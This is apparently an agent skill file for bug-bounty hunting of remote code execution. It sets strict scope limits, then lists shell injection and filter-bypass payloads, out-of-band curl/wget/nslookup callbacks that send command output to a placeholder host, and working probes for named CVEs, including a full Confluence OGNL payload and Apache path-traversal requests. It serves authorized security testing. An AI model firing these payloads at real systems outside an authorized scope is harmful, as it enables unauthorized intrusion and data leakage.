---
name: hunt-rce
description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target.
sources: github, hackerone_public
report_count: 67
---

# HUNT-RCE — Command and code execution

RCE means the server ran a command or code you supplied and you can show the result. A stack trace, a `49` from a template, a deserialized object, or "the upload returned 200" is a lead — hand it to the matching skill and finish the proof there.

## Rails
- In-scope only. One harmless command (`id`, `whoami`, `hostname`) or one OOB callback that contains that output.
- No reverse/bind shells, no cron or webshell left on disk, no `rm`, no fork bombs, no ransomware-style writes.
- No password cracking and no credential stuffing, including "leaked creds" to reach an admin panel.
- Dependency-confusion and exposed admin consoles are in-scope only when the program allows that action. A canary callback is the proof; delete the canary after.
- Do not create cluster pods, do not `hostPID`, do not enable `xp_cmdshell`. Stop at draft. Never auto-submit.
- Claim the user you actually ran as. "Could lead to RCE" is not a finding.

## Decision tree

1. **Name the interpreter** before choosing a payload. Shell (`sh`/`cmd`), template (`hunt-ssti`), deserializer (`hunt-deserialization`), file include (`hunt-lfi`), expression language (SpEL, OGNL, EL), SQL `COPY`/`xp_cmdshell` (`hunt-sqli`), upload handler (`hunt-file-upload`). Wrong family = noisy false positives.
2. **Baseline** the parameter (URL, body, filename, archive entry, image metadata, webhook, "test connection", export, PDF, CI script, admin config field).
3. **Detection, in order, stop at the first hit.**
   - Output: `; id` / `| id` / `$(id)` / `` `id` `` and the Windows pair `& whoami`. Look for `uid=` or a domain\user in the body.
   - Time: `; sleep 2` vs `; sleep 0`, interleaved n≥10, non-overlapping or Welch t > 3. Windows: `& ping -n 3 127.0.0.1` (three pings ≈ 2s, not a flood).
   - OOB: `; curl http://UNIQUE.collab/$(whoami)` or `nslookup UNIQUE.collab`. One host per sink.
4. **If metacharacters die but the value is an argument** (git URL, curl URL, find path, tar file, ImageMagick file, office converter): argument injection (`--upload-pack`, `-o`, `--config`) with the same OOB proof. Do not switch to a memory-corruption exploit.
5. **If the sink is a known product**, test that fingerprint only when the banner, endpoint, or error matches the row in the table. A version number alone is not RCE.
6. **Stop** when one callback or one `uid=` line is captured. Write the OS user, the host, and the request. Redact secrets (`evidence-hygiene`).

## Shell payloads

```
;id
|id
||id
&&id
$(id)
`id`
%0aid
;sleep 2
$(sleep 2)
;curl http://UNIQUE.collab/$(id|base64)
```
```
& whoami
| whoami
& ping -n 3 127.0.0.1
& nslookup UNIQUE.collab
```
Newline (`%0a`) when `;` is stripped. Spaces blocked: `cat${IFS}/etc/passwd`, `{id}`. Keyword blocked: `$(printf '\x69\x64')`, `i''d`. Quote the bypass that worked, not the whole list.

Argument injection (value reaches `execve` without a shell): a leading `-` or a second argument. Confirm with OOB, because there is often no stdout. Example shapes: `git clone --upload-pack='curl http://UNIQUE.collab/'`, `curl --output /dev/stdout file://...` only if you then see file bytes.

## Product fingerprints

Test the row only when the signal is present. Proof column is mandatory; a matching version is not.

| Signal | Probe | Proof |
|---|---|---|
| Apache 2.4.49 or 2.4.50 | `curl --path-as-is` ` /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd` (CVE-2021-41773 / CVE-2021-42013) | `root:x:0:0:` in the body. CGI RCE only if a CGI alias runs `id` the same way: POST body to `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` |
| Spring Cloud Function ≤ 3.2.2 / ≤ 3.1.6 and `/functionRouter` | Header `spring.cloud.function.routing-expression` (CVE-2022-22963) | OOB from `T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/"})`. `exec` returns no stdout |
| Spring MVC JDK9+ data binding on a property the app should not bind (CVE-2022-22965) | `class.module.classLoader...` pattern only on a fingerprinted vulnerable stack | OOB or a log line you can read. Do not spray this at every Spring app |
| Confluence only, CVE-2022-26134 / CVE-2023-22527 | URI OGNL that runs `id` and returns it in a response header (below). 2023-22527 is the `text-inline.vm` parameter on a matching version | header or body contains `uid=`. No webshell, no follow-up drop |
| Jenkins `/cli` plus args4j (CVE-2024-23897) | `help 1 @/etc/passwd` via the CLI jar | file bytes in the error text. This is a file read; call it RCE only if you also executed a command |
| SnakeYAML / Ruby `YAML.load` / XStream | `hunt-deserialization` URLDNS-style callback or `!!javax.script` / `!ruby/object` | OOB or `id`. Do not point a classloader at an exploit JAR until a DNS gadget has already fired |
| Admin "config" field for a daemon (syslog destination, collectd plugin, nomad/template, CI script) | template math from `hunt-ssti`, or a single `id` in the program field | output or one callback after the job runs |
| `kubectl` / `:6443` anonymous API | `GET /version` and `GET /api/v1/namespaces` | JSON from the API. Stop. Do not create workloads |
| Internal package name in a lockfile or error | public registry has no such name, program allows a canary | one install callback, then unpublish |

Apache path-as-is note: curl normalizes `%2e` unless `--path-as-is` is set. File read and CGI RCE are different impacts — report the one you showed.

Confluence CVE-2022-26134, only when the product is Confluence. One path. Read `X-Cmd-Response`. Do not write a file.
```
/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
```
CVE-2023-22527 is the `label` parameter on `/template/aui/text-inline.vm` on unpatched Data Center/Server. Same rule: one `id` in a header or body, then stop.

## Out of band

```
curl http://UNIQUE.collab/rce
nslookup UNIQUE.collab
wget -q -O- http://UNIQUE.collab/$(whoami)
```
Unique subdomain per sink so a late hit is attributable. A callback proves the command ran on a host that can reach you. It does not prove `root`. If the output is in the path (`/$(whoami)`), quote it.

Java `Runtime.exec(String)` tokenizes on spaces and does not run a shell. Use `String[]` or `{"/bin/sh","-c","id"}` when the probe is SpEL/OGNL. Python `subprocess` with `shell=False` ignores `;`. Match the API.

## Validation
- **Confirmed:** `uid=` / `whoami` text that you did not send as the parameter, or an OOB hit whose label/path is the command output, or a file you created and then fetched containing a marker (delete the marker).
- **Timing:** n≥10 interleaved; a single 2s blip is not enough.
- **Not RCE:** template `49` with a sandbox error (`hunt-ssti`), URLDNS or Log4j DNS with no command (`hunt-deserialization`), file contents with no exec (`hunt-lfi`), upload stored but not executed (`hunt-file-upload`), `exec` returned and the process might have started but you have no callback and no output.
- **Severity:** command execution as the app user is Critical when you show it. A sandboxed `id` that cannot touch the environment is whatever you showed, not "full compromise".

## Chains
- SQLi on Postgres/MSSQL → one `COPY ... TO PROGRAM 'curl http://UNIQUE.collab/'` or one `xp_cmdshell` **if it is already enabled**.
- SSTI gadget → this proof. Do not file both for the same request.
- Upload or LFI → one request to the script URL that prints `id`.
- SSRF → a loopback admin port that runs a script console (Jenkins script console, notebook). One command. IMDSv1 credential JSON is cloud-account impact, not host RCE; IMDSv2 GET without a token is not credentials.
- Prototype pollution → `child_process` / `NODE_OPTIONS` only when the callback fires. Pollution by itself is not RCE.
- ViewState / phar / pickle → `hunt-deserialization` proof, then cite this skill for impact wording.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
